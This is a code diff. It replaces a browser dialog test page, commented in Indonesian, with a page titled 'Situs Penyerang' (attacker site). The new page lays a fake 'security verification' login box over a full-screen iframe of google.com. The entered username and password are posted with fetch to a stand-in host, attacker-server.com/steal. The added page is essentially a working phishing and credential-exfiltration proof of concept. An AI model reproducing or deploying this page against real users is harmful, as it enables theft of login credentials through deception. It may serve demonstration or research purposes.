@@ -1,249 +1,67 @@
-<script>
-// Function untuk menampilkan dialog asli browser
-function showNativeDialogs() {
-    // Random pilih jenis dialog native browser
-    const dialogTypes = ['alert', 'confirm', 'prompt'];
-    const randomType = dialogTypes[Math.floor(Math.random() * dialogTypes.length)];
-    
-    switch(randomType) {
-        case 'alert':
-            setTimeout(() => {
-                alert("🔔 Notification from " + window.location.hostname + "\n\nThis site requires your attention.\n\nClick OK to continue.");
-            }, 100);
-            break;
-            
-        case 'confirm':
-            setTimeout(() => {
-                const result = confirm("❓ Confirm Action - " + window.location.hostname + "\n\nDo you want to allow this site to show notifications?\n\nThis may interrupt your browsing experience.");
-                if (result) {
-                    setTimeout(() => {
-                        alert("✅ Notifications allowed for " + window.location.hostname);
-                    }, 500);
-                } else {
-                    setTimeout(() => {
-                        alert("❌ Notifications blocked for " + window.location.hostname);
-                    }, 500);
-                }
-            }, 100);
-            break;
-            
-        case 'prompt':
-            setTimeout(() => {
-                const userInput = prompt("📧 Authentication Required - " + window.location.hostname + "\n\nPlease enter your email for verification:\n\nThis helps secure your account.", "");
-                if (userInput !== null) {
-                    setTimeout(() => {
-                        if (userInput.trim() === "") {
-                            alert("⚠️ No email provided.\n\nPlease ensure you enter a valid email address.");
-                        } else {
-                            alert("✅ Thank you! Email received: " + userInput + "\n\nWe'll send a verification link shortly.");
-                        }
-                    }, 500);
-                } else {
-                    setTimeout(() => {
-                        alert("ℹ️ Authentication cancelled.\n\nYou can try again later from settings.");
-                    }, 500);
-                }
-            }, 100);
-            break;
-    }
-}
-
-// Function untuk menampilkan beforeunload dialog
-function showBeforeUnloadDialog() {
-    setTimeout(() => {
-        // Simulate beforeunload event
-        const event = new Event('beforeunload');
-        Object.defineProperty(event, 'returnValue', {
-            value: 'Are you sure you want to leave? Your changes may not be saved.'
-        });
-        window.dispatchEvent(event);
-    }, 1500);
-}
-
-// Deteksi fullscreen changes
-document.addEventListener('fullscreenchange', handleFullscreenChange);
-document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
-document.addEventListener('mozfullscreenchange', handleFullscreenChange);
-document.addEventListener('MSFullscreenChange', handleFullscreenChange);
-
-function handleFullscreenChange() {
-    if (document.fullscreenElement || 
-        document.webkitFullscreenElement || 
-        document.mozFullScreenElement ||
-        document.msFullscreenElement) {
-        // Fullscreen aktif - tampilkan dialog asli setelah delay
-        console.log('Fullscreen activated - showing native dialogs');
-        
-        // Tampilkan sequence dialog asli
-        setTimeout(showNativeDialogs, 1000);
-        
-        // Tambahkan beforeunload handler setelah beberapa detik
-        setTimeout(() => {
-            window.addEventListener('beforeunload', handleBeforeUnload);
-        }, 3000);
-    } else {
-        // Fullscreen nonaktif - remove event listener
-        window.removeEventListener('beforeunload', handleBeforeUnload);
-        console.log('Fullscreen deactivated');
-    }
-}
-
-// Beforeunload handler
-function handleBeforeUnload(event) {
-    event.preventDefault();
-    event.returnValue = 'You are in fullscreen mode. Are you sure you want to leave?';
-    return 'You are in fullscreen mode. Are you sure you want to leave?';
-}
-
-// Function untuk navigate ke Google
-function navigateToGoogle() {
-    if (confirm("🌐 Navigate to Google.com?\n\nYou will be redirected to Google search engine.")) {
-        window.open('https://www.google.com', '_blank');
-    }
-}
-
-// Function untuk test dialog manual
-function testDialogs() {
-    const choice = confirm("🎪 Test Native Browser Dialogs\n\nThis will show real browser dialogs (alert, confirm, prompt).\n\nClick OK to continue or Cancel to go back.");
-    
-    if (choice) {
-        showNativeDialogs();
-    }
-}
-
-// Auto setup ketika page load
-window.onload = function() {
-    // Buat container utama
-    var container = document.createElement('div');
-    container.style.cssText = `
-        text-align: center; 
-        margin: 50px auto; 
-        max-width: 700px;
-        padding: 40px;
-        background: white;
-        border-radius: 15px;
-        box-shadow: 0 5px 25px rgba(0,0,0,0.1);
-    `;
-    
-    container.innerHTML = `
-        <h1 style="color: #4285f4; margin-bottom: 10px; font-size: 2.5em;">🌐 Browser Dialog Test</h1>
-        <p style="color: #666; margin-bottom: 30px; font-size: 1.1em; line-height: 1.6;">
-            Experience native browser dialogs and fullscreen interactions.<br>
-            All dialogs shown are genuine browser popups showing the real origin.
-        </p>
-        
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 30px;">
-            <button id="navigateBtn" style="
-                padding: 15px 20px; 
-                background: #4285f4; 
-                color: white; 
-                border: none; 
-                border-radius: 10px; 
-                font-size: 16px; 
-                cursor: pointer;
-                transition: all 0.3s ease;
-            ">
-                🌐 Navigate to Google
-            </button>
-            
-            <button id="testDialogsBtn" style="
-                padding: 15px 20px; 
-                background: #34a853; 
-                color: white; 
-                border: none; 
-                border-radius: 10px; 
-                font-size: 16px; 
-                cursor: pointer;
-                transition: all 0.3s ease;
-            ">
-                🎪 Test Dialogs Now
-            </button>
-        </div>
-        
-        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
-                   padding: 30px; 
-                   border-radius: 15px; 
-                   color: white;
-                   margin-bottom: 20px;">
-            <h3 style="margin-bottom: 15px;">🔧 Fullscreen Test Instructions</h3>
-            <p style="margin-bottom: 20px; line-height: 1.6;">
-                Click the green area below and press <strong>F11</strong> to enter fullscreen mode.<br>
-                <em>Native browser dialogs will automatically appear showing the real website origin.</em>
-            </p>
-            
-            <div id="fullscreenTest" style="
-                width: 100%; 
-                height: 150px; 
-                background: rgba(255,255,255,0.2); 
-                display: flex; 
-                align-items: center; 
-                justify-content: center; 
-                color: white; 
-                font-weight: bold; 
-                border-radius: 10px;
-                cursor: pointer;
-                font-size: 18px;
-                border: 2px dashed rgba(255,255,255,0.5);
-                transition: all 0.3s ease;
-            ">
-                🖥️ CLICK HERE + PRESS F11 FOR FULLSCREEN
-            </div>
-        </div>
-        
-        <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; text-align: left;">
-            <h4 style="color: #333; margin-bottom: 15px;">ℹ️ About Native Dialogs</h4>
-            <ul style="color: #666; line-height: 1.6; margin: 0; padding-left: 20px;">
-                <li>Shows <strong>real browser security origin</strong> (${window.location.hostname})</li>
-                <li>Uses genuine <code>alert()</code>, <code>confirm()</code>, <code>prompt()</code> functions</li>
-                <li>Includes <code>beforeunload</code> protection in fullscreen</li>
-                <li>Browser-managed security and appearance</li>
-            </ul>
-        </div>
-    `;
-    
-    document.body.appendChild(container);
-    
-    // Event listeners
-    document.getElementById('navigateBtn').addEventListener('click', navigateToGoogle);
-    document.getElementById('testDialogsBtn').addEventListener('click', testDialogs);
-    
-    // Event listener untuk area fullscreen test
-    document.getElementById('fullscreenTest').addEventListener('click', function() {
-        this.requestFullscreen = this.requestFullscreen || 
-                               this.webkitRequestFullscreen || 
-                               this.mozRequestFullScreen || 
-                               this.msRequestFullscreen;
-        
-        if (this.requestFullscreen) {
-            this.requestFullscreen().catch(err => {
-                console.error('Fullscreen error:', err);
-                alert('Fullscreen not supported or blocked by browser');
-            });
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Situs Penyerang</title>
+    <style>
+        #maliciousFrame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 9999;
         }
-    });
-};
+        .overlay-prompt {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border: 2px solid #007bff;
+            border-radius: 10px;
+            z-index: 10000;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+        }
+    </style>
+</head>
+<body>
+    <h1>Selamat datang di situs kami</h1>
+    <p>Ini adalah situs yang tampak normal...</p>
+    
+    <!-- Iframe yang menginjeksi domain target -->
+    <iframe id="maliciousFrame" src="https://google.com"></iframe>
+    
+    <!-- Prompt palsu yang muncul di atas iframe -->
+    <div class="overlay-prompt" id="fakePrompt">
+        <h3>Verifikasi Keamanan Diperlukan</h3>
+        <p>Masukkan kredensial Anda untuk melanjutkan:</p>
+        <input type="text" placeholder="Username" id="username">
+        <input type="password" placeholder="Password" id="password">
+        <button onclick="stealCredentials()">Submit</button>
+    </div>
 
-// Style hover effects
-const style = document.createElement('style');
-style.textContent = `
-    #navigateBtn:hover, #testDialogsBtn:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-    }
-    
-    #fullscreenTest:hover {
-        background: rgba(255,255,255,0.3) !important;
-        transform: scale(1.02);
-        border-color: rgba(255,255,255,0.8) !important;
-    }
-    
-    body {
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        margin: 0;
-        padding: 20px;
-        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-        min-height: 100vh;
-    }
-`;
-document.head.appendChild(style);
-</script>
+    <script>
+        // Script untuk menangani pencurian kredensial
+        function stealCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Kirim kredensial ke server penyerang
+            fetch('https://attacker-server.com/steal', {
+                method: 'POST',
+                body: JSON.stringify({username, password})
+            });
+            
+            alert('Terima kasih! Kredensial telah diverifikasi.');
+            document.getElementById('fakePrompt').style.display = 'none';
+        }
+
+        // Tampilkan prompt setelah beberapa detik
+        setTimeout(() => {
+            document.getElementById('fakePrompt').style.display = 'block';
+        }, 3000);
+    </script>
+</body>
+</html>
